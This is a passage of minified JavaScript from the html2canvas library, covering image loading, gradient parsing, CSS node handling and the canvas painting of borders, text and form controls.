Promise(function(d,e){c.image.onload=d,c.image.onerror=e,b&&(c.image.crossOrigin="anonymous"),c.image.src=a,c.image.complete===!0&&d(c.image)})}b.exports=d},{}],11:[function(a,b,c){function d(a,b){this.link=null,this.options=a,this.support=b,this.origin=this.getOrigin(window.location.href)}var e=a("./log"),f=a("./imagecontainer"),g=a("./dummyimagecontainer"),h=a("./proxyimagecontainer"),i=a("./framecontainer"),j=a("./svgcontainer"),k=a("./svgnodecontainer"),l=a("./lineargradientcontainer"),m=a("./webkitgradientcontainer"),n=a("./utils").bind;d.prototype.findImages=function(a){var b=[];return a.reduce(function(a,b){switch(b.node.nodeName){case"IMG":return a.concat([{args:[b.node.src],method:"url"}]);case"svg":case"IFRAME":return a.concat([{args:[b.node],method:b.node.nodeName}])}return a},[]).forEach(this.addImage(b,this.loadImage),this),b},d.prototype.findBackgroundImage=function(a,b){return b.parseBackgroundImages().filter(this.hasImageBackground).forEach(this.addImage(a,this.loadImage),this),a},d.prototype.addImage=function(a,b){return function(c){c.args.forEach(function(d){this.imageExists(a,d)||(a.splice(0,0,b.call(this,c)),e("Added image #"+a.length,"string"==typeof d?d.substring(0,100):d))},this)}},d.prototype.hasImageBackground=function(a){return"none"!==a.method},d.prototype.loadImage=function(a){if("url"===a.method){var b=a.args[0];return!this.isSVG(b)||this.support.svg||this.options.allowTaint?b.match(/data:image\/.*;base64,/i)?new f(b.replace(/url\(['"]{0,}|['"]{0,}\)$/gi,""),!1):this.isSameOrigin(b)||this.options.allowTaint===!0||this.isSVG(b)?new f(b,!1):this.support.cors&&!this.options.allowTaint&&this.options.useCORS?new f(b,!0):this.options.proxy?new h(b,this.options.proxy):new g(b):new j(b)}return"linear-gradient"===a.method?new l(a):"gradient"===a.method?new m(a):"svg"===a.method?new k(a.args[0],this.support.svg):"IFRAME"===a.method?new i(a.args[0],this.isSameOrigin(a.args[0].src),this.options):new g(a)},d.prototype.isSVG=function(a){return"svg"===a.substring(a.length-3).toLowerCase()||j.prototype.isInline(a)},d.prototype.imageExists=function(a,b){return a.some(function(a){return a.src===b})},d.prototype.isSameOrigin=function(a){return this.getOrigin(a)===this.origin},d.prototype.getOrigin=function(a){var b=this.link||(this.link=document.createElement("a"));return b.href=a,b.href=b.href,b.protocol+b.hostname+b.port},d.prototype.getPromise=function(a){return this.timeout(a,this.options.imageTimeout)["catch"](function(){var b=new g(a.src);return b.promise.then(function(b){a.image=b})})},d.prototype.get=function(a){var b=null;return this.images.some(function(c){return(b=c).src===a})?b:null},d.prototype.fetch=function(a){return this.images=a.reduce(n(this.findBackgroundImage,this),this.findImages(a)),this.images.forEach(function(a,b){a.promise.then(function(){e("Succesfully loaded image #"+(b+1),a)},function(c){e("Failed loading image #"+(b+1),a,c)})}),this.ready=Promise.all(this.images.map(this.getPromise,this)),e("Finished searching images"),this},d.prototype.timeout=function(a,b){var c,d=Promise.race([a.promise,new Promise(function(d,f){c=setTimeout(function(){e("Timed out loading image",a),f(a)},b)})]).then(function(a){return clearTimeout(c),a});return d["catch"](function(){clearTimeout(c)}),d},b.exports=d},{"./dummyimagecontainer":5,"./framecontainer":8,"./imagecontainer":10,"./lineargradientcontainer":12,"./log":13,"./proxyimagecontainer":17,"./svgcontainer":23,"./svgnodecontainer":24,"./utils":26,"./webkitgradientcontainer":27}],12:[function(a,b,c){function d(a){e.apply(this,arguments),this.type=e.TYPES.LINEAR;var b=d.REGEXP_DIRECTION.test(a.args[0])||!e.REGEXP_COLORSTOP.test(a.args[0]);b?a.args[0].split(/\s+/).reverse().forEach(function(a,b){switch(a){case"left":this.x0=0,this.x1=1;break;case"top":this.y0=0,this.y1=1;break;case"right":this.x0=1,this.x1=0;break;case"bottom":this.y0=1,this.y1=0;break;case"to":var c=this.y0,d=this.x0;this.y0=this.y1,this.x0=this.x1,this.x1=d,this.y1=c;break;case"center":break;default:var e=.01*parseFloat(a,10);if(isNaN(e))break;0===b?(this.y0=e,this.y1=1-this.y0):(this.x0=e,this.x1=1-this.x0)}},this):(this.y0=0,this.y1=1),this.colorStops=a.args.slice(b?1:0).map(function(a){var b=a.match(e.REGEXP_COLORSTOP),c=+b[2],d=0===c?"%":b[3];return{color:new f(b[1]),stop:"%"===d?c/100:null}}),null===this.colorStops[0].stop&&(this.colorStops[0].stop=0),null===this.colorStops[this.colorStops.length-1].stop&&(this.colorStops[this.colorStops.length-1].stop=1),this.colorStops.forEach(function(a,b){null===a.stop&&this.colorStops.slice(b).some(function(c,d){return null!==c.stop?(a.stop=(c.stop-this.colorStops[b-1].stop)/(d+1)+this.colorStops[b-1].stop,!0):!1},this)},this)}var e=a("./gradientcontainer"),f=a("./color");d.prototype=Object.create(e.prototype),d.REGEXP_DIRECTION=/^\s*(?:to|left|right|top|bottom|center|\d{1,3}(?:\.\d+)?%?)(?:\s|$)/i,b.exports=d},{"./color":3,"./gradientcontainer":9}],13:[function(a,b,c){b.exports=function(){window.html2canvas.logging&&window.console&&window.console.log&&Function.prototype.bind.call(window.console.log,window.console).apply(window.console,[Date.now()-window.html2canvas.start+"ms","html2canvas:"].concat([].slice.call(arguments,0)))}},{}],14:[function(a,b,c){function d(a,b){this.node=a,this.parent=b,this.stack=null,this.bounds=null,this.borders=null,this.clip=[],this.backgroundClip=[],this.offsetBounds=null,this.visible=null,this.computedStyles=null,this.colors={},this.styles={},this.backgroundImages=null,this.transformData=null,this.transformMatrix=null,this.isPseudoElement=!1,this.opacity=null}function e(a){var b=a.options[a.selectedIndex||0];return b?b.text||"":""}function f(a){if(a&&"matrix"===a[1])return a[2].split(",").map(function(a){return parseFloat(a.trim())});if(a&&"matrix3d"===a[1]){var b=a[2].split(",").map(function(a){return parseFloat(a.trim())});return[b[0],b[1],b[4],b[5],b[12],b[13]]}}function g(a){return-1!==a.toString().indexOf("%")}function h(a){return a.replace("px","")}function i(a){return parseFloat(a)}var j=a("./color"),k=a("./utils"),l=k.getBounds,m=k.parseBackgrounds,n=k.offsetBounds;d.prototype.cloneTo=function(a){a.visible=this.visible,a.borders=this.borders,a.bounds=this.bounds,a.clip=this.clip,a.backgroundClip=this.backgroundClip,a.computedStyles=this.computedStyles,a.styles=this.styles,a.backgroundImages=this.backgroundImages,a.opacity=this.opacity},d.prototype.getOpacity=function(){return null===this.opacity?this.opacity=this.cssFloat("opacity"):this.opacity},d.prototype.assignStack=function(a){this.stack=a,a.children.push(this)},d.prototype.isElementVisible=function(){return this.node.nodeType===Node.TEXT_NODE?this.parent.visible:"none"!==this.css("display")&&"hidden"!==this.css("visibility")&&!this.node.hasAttribute("data-html2canvas-ignore")&&("INPUT"!==this.node.nodeName||"hidden"!==this.node.getAttribute("type"))},d.prototype.css=function(a){return this.computedStyles||(this.computedStyles=this.isPseudoElement?this.parent.computedStyle(this.before?":before":":after"):this.computedStyle(null)),this.styles[a]||(this.styles[a]=this.computedStyles[a])},d.prototype.prefixedCss=function(a){var b=["webkit","moz","ms","o"],c=this.css(a);return void 0===c&&b.some(function(b){return c=this.css(b+a.substr(0,1).toUpperCase()+a.substr(1)),void 0!==c},this),void 0===c?null:c},d.prototype.computedStyle=function(a){return this.node.ownerDocument.defaultView.getComputedStyle(this.node,a)},d.prototype.cssInt=function(a){var b=parseInt(this.css(a),10);return isNaN(b)?0:b},d.prototype.color=function(a){return this.colors[a]||(this.colors[a]=new j(this.css(a)))},d.prototype.cssFloat=function(a){var b=parseFloat(this.css(a));return isNaN(b)?0:b},d.prototype.fontWeight=function(){var a=this.css("fontWeight");switch(parseInt(a,10)){case 401:a="bold";break;case 400:a="normal"}return a},d.prototype.parseClip=function(){var a=this.css("clip").match(this.CLIP);return a?{top:parseInt(a[1],10),right:parseInt(a[2],10),bottom:parseInt(a[3],10),left:parseInt(a[4],10)}:null},d.prototype.parseBackgroundImages=function(){return this.backgroundImages||(this.backgroundImages=m(this.css("backgroundImage")))},d.prototype.cssList=function(a,b){var c=(this.css(a)||"").split(",");return c=c[b||0]||c[0]||"auto",c=c.trim().split(" "),1===c.length&&(c=[c[0],g(c[0])?"auto":c[0]]),c},d.prototype.parseBackgroundSize=function(a,b,c){var d,e,f=this.cssList("backgroundSize",c);if(g(f[0]))d=a.width*parseFloat(f[0])/100;else{if(/contain|cover/.test(f[0])){var h=a.width/a.height,i=b.width/b.height;return i>h^"contain"===f[0]?{width:a.height*i,height:a.height}:{width:a.width,height:a.width/i}}d=parseInt(f[0],10)}return e="auto"===f[0]&&"auto"===f[1]?b.height:"auto"===f[1]?d/b.width*b.height:g(f[1])?a.height*parseFloat(f[1])/100:parseInt(f[1],10),"auto"===f[0]&&(d=e/b.height*b.width),{width:d,height:e}},d.prototype.parseBackgroundPosition=function(a,b,c,d){var e,f,h=this.cssList("backgroundPosition",c);return e=g(h[0])?(a.width-(d||b).width)*(parseFloat(h[0])/100):parseInt(h[0],10),f="auto"===h[1]?e/b.width*b.height:g(h[1])?(a.height-(d||b).height)*parseFloat(h[1])/100:parseInt(h[1],10),"auto"===h[0]&&(e=f/b.height*b.width),{left:e,top:f}},d.prototype.parseBackgroundRepeat=function(a){return this.cssList("backgroundRepeat",a)[0]},d.prototype.parseTextShadows=function(){var a=this.css("textShadow"),b=[];if(a&&"none"!==a)for(var c=a.match(this.TEXT_SHADOW_PROPERTY),d=0;c&&d<c.length;d++){var e=c[d].match(this.TEXT_SHADOW_VALUES);b.push({color:new j(e[0]),offsetX:e[1]?parseFloat(e[1].replace("px","")):0,offsetY:e[2]?parseFloat(e[2].replace("px","")):0,blur:e[3]?e[3].replace("px",""):0})}return b},d.prototype.parseTransform=function(){if(!this.transformData)if(this.hasTransform()){var a=this.parseBounds(),b=this.prefixedCss("transformOrigin").split(" ").map(h).map(i);b[0]+=a.left,b[1]+=a.top,this.transformData={origin:b,matrix:this.parseTransformMatrix()}}else this.transformData={origin:[0,0],matrix:[1,0,0,1,0,0]};return this.transformData},d.prototype.parseTransformMatrix=function(){if(!this.transformMatrix){var a=this.prefixedCss("transform"),b=a?f(a.match(this.MATRIX_PROPERTY)):null;this.transformMatrix=b?b:[1,0,0,1,0,0]}return this.transformMatrix},d.prototype.parseBounds=function(){return this.bounds||(this.bounds=this.hasTransform()?n(this.node):l(this.node))},d.prototype.hasTransform=function(){return"1,0,0,1,0,0"!==this.parseTransformMatrix().join(",")||this.parent&&this.parent.hasTransform()},d.prototype.getValue=function(){var a=this.node.value||"";return"SELECT"===this.node.tagName?a=e(this.node):"password"===this.node.type&&(a=Array(a.length+1).join("•")),0===a.length?this.node.placeholder||"":a},d.prototype.MATRIX_PROPERTY=/(matrix|matrix3d)\((.+)\)/,d.prototype.TEXT_SHADOW_PROPERTY=/((rgba|rgb)\([^\)]+\)(\s-?\d+px){0,})/g,d.prototype.TEXT_SHADOW_VALUES=/(-?\d+px)|(#.+)|(rgb\(.+\))|(rgba\(.+\))/g,d.prototype.CLIP=/^rect\((\d+)px,? (\d+)px,? (\d+)px,? (\d+)px\)$/,b.exports=d},{"./color":3,"./utils":26}],15:[function(a,b,c){function d(a,b,c,d,e){O("Starting NodeParser"),this.renderer=b,this.options=e,this.range=null,this.support=c,this.renderQueue=[],this.stack=new V(!0,1,a.ownerDocument,null);var f=new Q(a,null);if(e.background&&b.rectangle(0,0,b.width,b.height,new U(e.background)),a===a.ownerDocument.documentElement){var g=new Q(f.color("backgroundColor").isTransparent()?a.ownerDocument.body:a.ownerDocument.documentElement,null);b.rectangle(0,0,b.width,b.height,g.color("backgroundColor"))}f.visibile=f.isElementVisible(),this.createPseudoHideStyles(a.ownerDocument),this.disableAnimations(a.ownerDocument),this.nodes=J([f].concat(this.getChildren(f)).filter(function(a){return a.visible=a.isElementVisible()}).map(this.getPseudoElements,this)),this.fontMetrics=new T,O("Fetched nodes, total:",this.nodes.length),O("Calculate overflow clips"),this.calculateOverflowClips(),O("Start fetching images"),this.images=d.fetch(this.nodes.filter(B)),this.ready=this.images.ready.then(X(function(){return O("Images loaded, starting parsing"),O("Creating stacking contexts"),this.createStackingContexts(),O("Sorting stacking contexts"),this.sortStackingContexts(this.stack),this.parse(this.stack),O("Render queue created with "+this.renderQueue.length+" items"),new Promise(X(function(a){e.async?"function"==typeof e.async?e.async.call(this,this.renderQueue,a):this.renderQueue.length>0?(this.renderIndex=0,this.asyncRenderer(this.renderQueue,a)):a():(this.renderQueue.forEach(this.paint,this),a())},this))},this))}function e(a){return a.parent&&a.parent.clip.length}function f(a){return a.replace(/(\-[a-z])/g,function(a){return a.toUpperCase().replace("-","")})}function g(){}function h(a,b,c,d){return a.map(function(e,f){if(e.width>0){var g=b.left,h=b.top,i=b.width,j=b.height-a[2].width;switch(f){case 0:j=a[0].width,e.args=l({c1:[g,h],c2:[g+i,h],c3:[g+i-a[1].width,h+j],c4:[g+a[3].width,h+j]},d[0],d[1],c.topLeftOuter,c.topLeftInner,c.topRightOuter,c.topRightInner);break;case 1:g=b.left+b.width-a[1].width,i=a[1].width,e.args=l({c1:[g+i,h],c2:[g+i,h+j+a[2].width],c3:[g,h+j],c4:[g,h+a[0].width]},d[1],d[2],c.topRightOuter,c.topRightInner,c.bottomRightOuter,c.bottomRightInner);break;case 2:h=h+b.height-a[2].width,j=a[2].width,e.args=l({c1:[g+i,h+j],c2:[g,h+j],c3:[g+a[3].width,h],c4:[g+i-a[3].width,h]},d[2],d[3],c.bottomRightOuter,c.bottomRightInner,c.bottomLeftOuter,c.bottomLeftInner);break;case 3:i=a[3].width,e.args=l({c1:[g,h+j+a[2].width],c2:[g,h],c3:[g+i,h+a[0].width],c4:[g+i,h+j]},d[3],d[0],c.bottomLeftOuter,c.bottomLeftInner,c.topLeftOuter,c.topLeftInner)}}return e})}function i(a,b,c,d){var e=4*((Math.sqrt(2)-1)/3),f=c*e,g=d*e,h=a+c,i=b+d;return{topLeft:k({x:a,y:i},{x:a,y:i-g},{x:h-f,y:b},{x:h,y:b}),topRight:k({x:a,y:b},{x:a+f,y:b},{x:h,y:i-g},{x:h,y:i}),bottomRight:k({x:h,y:b},{x:h,y:b+g},{x:a+f,y:i},{x:a,y:i}),bottomLeft:k({x:h,y:i},{x:h-f,y:i},{x:a,y:b+g},{x:a,y:b})}}function j(a,b,c){var d=a.left,e=a.top,f=a.width,g=a.height,h=b[0][0]<f/2?b[0][0]:f/2,j=b[0][1]<g/2?b[0][1]:g/2,k=b[1][0]<f/2?b[1][0]:f/2,l=b[1][1]<g/2?b[1][1]:g/2,m=b[2][0]<f/2?b[2][0]:f/2,n=b[2][1]<g/2?b[2][1]:g/2,o=b[3][0]<f/2?b[3][0]:f/2,p=b[3][1]<g/2?b[3][1]:g/2,q=f-k,r=g-n,s=f-m,t=g-p;return{topLeftOuter:i(d,e,h,j).topLeft.subdivide(.5),topLeftInner:i(d+c[3].width,e+c[0].width,Math.max(0,h-c[3].width),Math.max(0,j-c[0].width)).topLeft.subdivide(.5),topRightOuter:i(d+q,e,k,l).topRight.subdivide(.5),topRightInner:i(d+Math.min(q,f+c[3].width),e+c[0].width,q>f+c[3].width?0:k-c[3].width,l-c[0].width).topRight.subdivide(.5),bottomRightOuter:i(d+s,e+r,m,n).bottomRight.subdivide(.5),bottomRightInner:i(d+Math.min(s,f-c[3].width),e+Math.min(r,g+c[0].width),Math.max(0,m-c[1].width),n-c[2].width).bottomRight.subdivide(.5),
bottomLeftOuter:i(d,e+t,o,p).bottomLeft.subdivide(.5),bottomLeftInner:i(d+c[3].width,e+t,Math.max(0,o-c[3].width),p-c[2].width).bottomLeft.subdivide(.5)}}function k(a,b,c,d){var e=function(a,b,c){return{x:a.x+(b.x-a.x)*c,y:a.y+(b.y-a.y)*c}};return{start:a,startControl:b,endControl:c,end:d,subdivide:function(f){var g=e(a,b,f),h=e(b,c,f),i=e(c,d,f),j=e(g,h,f),l=e(h,i,f),m=e(j,l,f);return[k(a,g,j,m),k(m,l,i,d)]},curveTo:function(a){a.push(["bezierCurve",b.x,b.y,c.x,c.y,d.x,d.y])},curveToReversed:function(d){d.push(["bezierCurve",c.x,c.y,b.x,b.y,a.x,a.y])}}}function l(a,b,c,d,e,f,g){var h=[];return b[0]>0||b[1]>0?(h.push(["line",d[1].start.x,d[1].start.y]),d[1].curveTo(h)):h.push(["line",a.c1[0],a.c1[1]]),c[0]>0||c[1]>0?(h.push(["line",f[0].start.x,f[0].start.y]),f[0].curveTo(h),h.push(["line",g[0].end.x,g[0].end.y]),g[0].curveToReversed(h)):(h.push(["line",a.c2[0],a.c2[1]]),h.push(["line",a.c3[0],a.c3[1]])),b[0]>0||b[1]>0?(h.push(["line",e[1].end.x,e[1].end.y]),e[1].curveToReversed(h)):h.push(["line",a.c4[0],a.c4[1]]),h}function m(a,b,c,d,e,f,g){b[0]>0||b[1]>0?(a.push(["line",d[0].start.x,d[0].start.y]),d[0].curveTo(a),d[1].curveTo(a)):a.push(["line",f,g]),(c[0]>0||c[1]>0)&&a.push(["line",e[0].start.x,e[0].start.y])}function n(a){return a.cssInt("zIndex")<0}function o(a){return a.cssInt("zIndex")>0}function p(a){return 0===a.cssInt("zIndex")}function q(a){return-1!==["inline","inline-block","inline-table"].indexOf(a.css("display"))}function r(a){return a instanceof V}function s(a){return a.node.data.trim().length>0}function t(a){return/^(normal|none|0px)$/.test(a.parent.css("letterSpacing"))}function u(a){return["TopLeft","TopRight","BottomRight","BottomLeft"].map(function(b){var c=a.css("border"+b+"Radius"),d=c.split(" ");return d.length<=1&&(d[1]=d[0]),d.map(G)})}function v(a){return a.nodeType===Node.TEXT_NODE||a.nodeType===Node.ELEMENT_NODE}function w(a){var b=a.css("position"),c=-1!==["absolute","relative","fixed"].indexOf(b)?a.css("zIndex"):"auto";return"auto"!==c}function x(a){return"static"!==a.css("position")}function y(a){return"none"!==a.css("float")}function z(a){return-1!==["inline-block","inline-table"].indexOf(a.css("display"))}function A(a){var b=this;return function(){return!a.apply(b,arguments)}}function B(a){return a.node.nodeType===Node.ELEMENT_NODE}function C(a){return a.isPseudoElement===!0}function D(a){return a.node.nodeType===Node.TEXT_NODE}function E(a){return function(b,c){return b.cssInt("zIndex")+a.indexOf(b)/a.length-(c.cssInt("zIndex")+a.indexOf(c)/a.length)}}function F(a){return a.getOpacity()<1}function G(a){return parseInt(a,10)}function H(a){return a.width}function I(a){return a.node.nodeType!==Node.ELEMENT_NODE||-1===["SCRIPT","HEAD","TITLE","OBJECT","BR","OPTION"].indexOf(a.node.nodeName)}function J(a){return[].concat.apply([],a)}function K(a){var b=a.substr(0,1);return b===a.substr(a.length-1)&&b.match(/'|"/)?a.substr(1,a.length-2):a}function L(a){for(var b,c=[],d=0,e=!1;a.length;)M(a[d])===e?(b=a.splice(0,d),b.length&&c.push(P.ucs2.encode(b)),e=!e,d=0):d++,d>=a.length&&(b=a.splice(0,d),b.length&&c.push(P.ucs2.encode(b)));return c}function M(a){return-1!==[32,13,10,9,45].indexOf(a)}function N(a){return/[^\u0000-\u00ff]/.test(a)}var O=a("./log"),P=a("punycode"),Q=a("./nodecontainer"),R=a("./textcontainer"),S=a("./pseudoelementcontainer"),T=a("./fontmetrics"),U=a("./color"),V=a("./stackingcontext"),W=a("./utils"),X=W.bind,Y=W.getBounds,Z=W.parseBackgrounds,$=W.offsetBounds;d.prototype.calculateOverflowClips=function(){this.nodes.forEach(function(a){if(B(a)){C(a)&&a.appendToDOM(),a.borders=this.parseBorders(a);var b="hidden"===a.css("overflow")?[a.borders.clip]:[],c=a.parseClip();c&&-1!==["absolute","fixed"].indexOf(a.css("position"))&&b.push([["rect",a.bounds.left+c.left,a.bounds.top+c.top,c.right-c.left,c.bottom-c.top]]),a.clip=e(a)?a.parent.clip.concat(b):b,a.backgroundClip="hidden"!==a.css("overflow")?a.clip.concat([a.borders.clip]):a.clip,C(a)&&a.cleanDOM()}else D(a)&&(a.clip=e(a)?a.parent.clip:[]);C(a)||(a.bounds=null)},this)},d.prototype.asyncRenderer=function(a,b,c){c=c||Date.now(),this.paint(a[this.renderIndex++]),a.length===this.renderIndex?b():c+20>Date.now()?this.asyncRenderer(a,b,c):setTimeout(X(function(){this.asyncRenderer(a,b)},this),0)},d.prototype.createPseudoHideStyles=function(a){this.createStyles(a,"."+S.prototype.PSEUDO_HIDE_ELEMENT_CLASS_BEFORE+':before { content: "" !important; display: none !important; }.'+S.prototype.PSEUDO_HIDE_ELEMENT_CLASS_AFTER+':after { content: "" !important; display: none !important; }')},d.prototype.disableAnimations=function(a){this.createStyles(a,"* { -webkit-animation: none !important; -moz-animation: none !important; -o-animation: none !important; animation: none !important; -webkit-transition: none !important; -moz-transition: none !important; -o-transition: none !important; transition: none !important;}")},d.prototype.createStyles=function(a,b){var c=a.createElement("style");c.innerHTML=b,a.body.appendChild(c)},d.prototype.getPseudoElements=function(a){var b=[[a]];if(a.node.nodeType===Node.ELEMENT_NODE){var c=this.getPseudoElement(a,":before"),d=this.getPseudoElement(a,":after");c&&b.push(c),d&&b.push(d)}return J(b)},d.prototype.getPseudoElement=function(a,b){var c=a.computedStyle(b);if(!c||!c.content||"none"===c.content||"-moz-alt-content"===c.content||"none"===c.display)return null;for(var d=K(c.content),e="url"===d.substr(0,3),g=document.createElement(e?"img":"html2canvaspseudoelement"),h=new S(g,a,b),i=c.length-1;i>=0;i--){var j=f(c.item(i));g.style[j]=c[j]}if(g.className=S.prototype.PSEUDO_HIDE_ELEMENT_CLASS_BEFORE+" "+S.prototype.PSEUDO_HIDE_ELEMENT_CLASS_AFTER,e)return g.src=Z(d)[0].args[0],[h];var k=document.createTextNode(d);return g.appendChild(k),[h,new R(k,h)]},d.prototype.getChildren=function(a){return J([].filter.call(a.node.childNodes,v).map(function(b){var c=[b.nodeType===Node.TEXT_NODE?new R(b,a):new Q(b,a)].filter(I);return b.nodeType===Node.ELEMENT_NODE&&c.length&&"TEXTAREA"!==b.tagName?c[0].isElementVisible()?c.concat(this.getChildren(c[0])):[]:c},this))},d.prototype.newStackingContext=function(a,b){var c=new V(b,a.getOpacity(),a.node,a.parent);a.cloneTo(c);var d=b?c.getParentStack(this):c.parent.stack;d.contexts.push(c),a.stack=c},d.prototype.createStackingContexts=function(){this.nodes.forEach(function(a){B(a)&&(this.isRootElement(a)||F(a)||w(a)||this.isBodyWithTransparentRoot(a)||a.hasTransform())?this.newStackingContext(a,!0):B(a)&&(x(a)&&p(a)||z(a)||y(a))?this.newStackingContext(a,!1):a.assignStack(a.parent.stack)},this)},d.prototype.isBodyWithTransparentRoot=function(a){return"BODY"===a.node.nodeName&&a.parent.color("backgroundColor").isTransparent()},d.prototype.isRootElement=function(a){return null===a.parent},d.prototype.sortStackingContexts=function(a){a.contexts.sort(E(a.contexts.slice(0))),a.contexts.forEach(this.sortStackingContexts,this)},d.prototype.parseTextBounds=function(a){return function(b,c,d){if("none"!==a.parent.css("textDecoration").substr(0,4)||0!==b.trim().length){if(this.support.rangeBounds&&!a.parent.hasTransform()){var e=d.slice(0,c).join("").length;return this.getRangeBounds(a.node,e,b.length)}if(a.node&&"string"==typeof a.node.data){var f=a.node.splitText(b.length),g=this.getWrapperBounds(a.node,a.parent.hasTransform());return a.node=f,g}}else(!this.support.rangeBounds||a.parent.hasTransform())&&(a.node=a.node.splitText(b.length));return{}}},d.prototype.getWrapperBounds=function(a,b){var c=a.ownerDocument.createElement("html2canvaswrapper"),d=a.parentNode,e=a.cloneNode(!0);c.appendChild(a.cloneNode(!0)),d.replaceChild(c,a);var f=b?$(c):Y(c);return d.replaceChild(e,c),f},d.prototype.getRangeBounds=function(a,b,c){var d=this.range||(this.range=a.ownerDocument.createRange());return d.setStart(a,b),d.setEnd(a,b+c),d.getBoundingClientRect()},d.prototype.parse=function(a){var b=a.contexts.filter(n),c=a.children.filter(B),d=c.filter(A(y)),e=d.filter(A(x)).filter(A(q)),f=c.filter(A(x)).filter(y),h=d.filter(A(x)).filter(q),i=a.contexts.concat(d.filter(x)).filter(p),j=a.children.filter(D).filter(s),k=a.contexts.filter(o);b.concat(e).concat(f).concat(h).concat(i).concat(j).concat(k).forEach(function(a){this.renderQueue.push(a),r(a)&&(this.parse(a),this.renderQueue.push(new g))},this)},d.prototype.paint=function(a){try{a instanceof g?this.renderer.ctx.restore():D(a)?(C(a.parent)&&a.parent.appendToDOM(),this.paintText(a),C(a.parent)&&a.parent.cleanDOM()):this.paintNode(a)}catch(b){if(O(b),this.options.strict)throw b}},d.prototype.paintNode=function(a){r(a)&&(this.renderer.setOpacity(a.opacity),this.renderer.ctx.save(),a.hasTransform()&&this.renderer.setTransform(a.parseTransform())),"INPUT"===a.node.nodeName&&"checkbox"===a.node.type?this.paintCheckbox(a):"INPUT"===a.node.nodeName&&"radio"===a.node.type?this.paintRadio(a):this.paintElement(a)},d.prototype.paintElement=function(a){var b=a.parseBounds();this.renderer.clip(a.backgroundClip,function(){this.renderer.renderBackground(a,b,a.borders.borders.map(H))},this),this.renderer.clip(a.clip,function(){this.renderer.renderBorders(a.borders.borders)},this),this.renderer.clip(a.backgroundClip,function(){switch(a.node.nodeName){case"svg":case"IFRAME":var c=this.images.get(a.node);c?this.renderer.renderImage(a,b,a.borders,c):O("Error loading <"+a.node.nodeName+">",a.node);break;case"IMG":var d=this.images.get(a.node.src);d?this.renderer.renderImage(a,b,a.borders,d):O("Error loading <img>",a.node.src);break;case"CANVAS":this.renderer.renderImage(a,b,a.borders,{image:a.node});break;case"SELECT":case"INPUT":case"TEXTAREA":this.paintFormValue(a)}},this)},d.prototype.paintCheckbox=function(a){var b=a.parseBounds(),c=Math.min(b.width,b.height),d={width:c-1,height:c-1,top:b.top,left:b.left},e=[3,3],f=[e,e,e,e],g=[1,1,1,1].map(function(a){return{color:new U("#A5A5A5"),width:a}}),i=j(d,f,g);this.renderer.clip(a.backgroundClip,function(){this.renderer.rectangle(d.left+1,d.top+1,d.width-2,d.height-2,new U("#DEDEDE")),this.renderer.renderBorders(h(g,d,i,f)),a.node.checked&&(this.renderer.font(new U("#424242"),"normal","normal","bold",c-3+"px","arial"),this.renderer.text("✔",d.left+c/6,d.top+c-1))},this)},d.prototype.paintRadio=function(a){var b=a.parseBounds(),c=Math.min(b.width,b.height)-2;this.renderer.clip(a.backgroundClip,function(){this.renderer.circleStroke(b.left+1,b.top+1,c,new U("#DEDEDE"),1,new U("#A5A5A5")),a.node.checked&&this.renderer.circle(Math.ceil(b.left+c/4)+1,Math.ceil(b.top+c/4)+1,Math.floor(c/2),new U("#424242"))},this)},d.prototype.paintFormValue=function(a){var b=a.getValue();if(b.length>0){var c=a.node.ownerDocument,d=c.createElement("html2canvaswrapper"),e=["lineHeight","textAlign","fontFamily","fontWeight","fontSize","color","paddingLeft","paddingTop","paddingRight","paddingBottom","width","height","borderLeftStyle","borderTopStyle","borderLeftWidth","borderTopWidth","boxSizing","whiteSpace","wordWrap"];e.forEach(function(b){try{d.style[b]=a.css(b)}catch(c){O("html2canvas: Parse: Exception caught in renderFormValue: "+c.message)}});var f=a.parseBounds();d.style.position="fixed",d.style.left=f.left+"px",d.style.top=f.top+"px",d.textContent=b,c.body.appendChild(d),this.paintText(new R(d.firstChild,a)),c.body.removeChild(d)}},d.prototype.paintText=function(a){a.applyTextTransform();var b=P.ucs2.decode(a.node.data),c=this.options.letterRendering&&!t(a)||N(a.node.data)?b.map(function(a){return P.ucs2.encode([a])}):L(b),d=a.parent.fontWeight(),e=a.parent.css("fontSize"),f=a.parent.css("fontFamily"),g=a.parent.parseTextShadows();this.renderer.font(a.parent.color("color"),a.parent.css("fontStyle"),a.parent.css("fontVariant"),d,e,f),g.length?this.renderer.fontShadow(g[0].color,g[0].offsetX,g[0].offsetY,g[0].blur):this.renderer.clearShadow(),this.renderer.clip(a.parent.clip,function(){c.map(this.parseTextBounds(a),this).forEach(function(b,d){b&&(this.renderer.text(c[d],b.left,b.bottom),this.renderTextDecoration(a.parent,b,this.fontMetrics.getMetrics(f,e)))},this)},this)},d.prototype.renderTextDecoration=function(a,b,c){switch(a.css("textDecoration").split(" ")[0]){case"underline":this.renderer.rectangle(b.left,Math.round(b.top+c.baseline+c.lineWidth),b.width,1,a.color("color"));break;case"overline":this.renderer.rectangle(b.left,Math.round(b.top),b.width,1,a.color("color"));break;case"line-through":this.renderer.rectangle(b.left,Math.ceil(b.top+c.middle+c.lineWidth),b.width,1,a.color("color"))}};var _={inset:[["darken",.6],["darken",.1],["darken",.1],["darken",.6]]};d.prototype.parseBorders=function(a){var b=a.parseBounds(),c=u(a),d=["Top","Right","Bottom","Left"].map(function(b,c){var d=a.css("border"+b+"Style"),e=a.color("border"+b+"Color");"inset"===d&&e.isBlack()&&(e=new U([255,255,255,e.a]));var f=_[d]?_[d][c]:null;return{width:a.cssInt("border"+b+"Width"),color:f?e[f[0]](f[1]):e,args:null}}),e=j(b,c,d);return{clip:this.parseBackgroundClip(a,e,d,c,b),borders:h(d,b,e,c)}},d.prototype.parseBackgroundClip=function(a,b,c,d,e){var f=a.css("backgroundClip"),g=[];switch(f){case"content-box":case"padding-box":m(g,d[0],d[1],b.topLeftInner,b.topRightInner,e.left+c[3].width,e.top+c[0].width),m(g,d[1],d[2],b.topRightInner,b.bottomRightInner,e.left+e.width-c[1].width,e.top+c[0].width),m(g,d[2],d[3],b.bottomRightInner,b.bottomLeftInner,e.left+e.width-c[1].width,e.top+e.height-c[2].width),m(g,d[3],d[0],b.bottomLeftInner,b.topLeftInner,e.left+c[3].width,e.top+e.height-c[2].width);break;default:m(g,d[0],d[1],b.topLeftOuter,b.topRightOuter,e.left,e.top),m(g,d[1],d[2],b.topRightOuter,b.bottomRightOuter,e.left+e.width,e.top),m(g,d[2],d[3],b.bottomRightOuter,b.bottomLeftOuter,e.left+e.width,e.top+e.height),m(g,d[3],d[0],b.bottomLeftOuter,b.topLeftOuter,e.left,e.top+e.height)}return 